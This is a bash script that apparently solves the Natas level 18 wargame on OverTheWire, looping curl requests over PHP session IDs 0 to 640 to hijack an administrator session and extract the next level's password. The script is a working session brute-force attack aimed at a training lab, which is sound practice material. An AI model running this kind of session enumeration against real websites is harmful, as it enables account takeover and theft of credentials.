#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
fi

for i in `seq 0 640`
do
 tmp=`curl -s --user natas18:$1 -b "PHPSESSID=$i" http://natas18.natas.labs.overthewire.org/`
 printf '\rLooking in session %03d' $i
 echo $tmp | grep 'Password' >> /dev/null
 if [ $? -eq 0 ]; then
   printf '\nPassword found in session %03d\n' $i
   echo $tmp | grep -E -o $'Password: .{32}'
   break
 fi
done
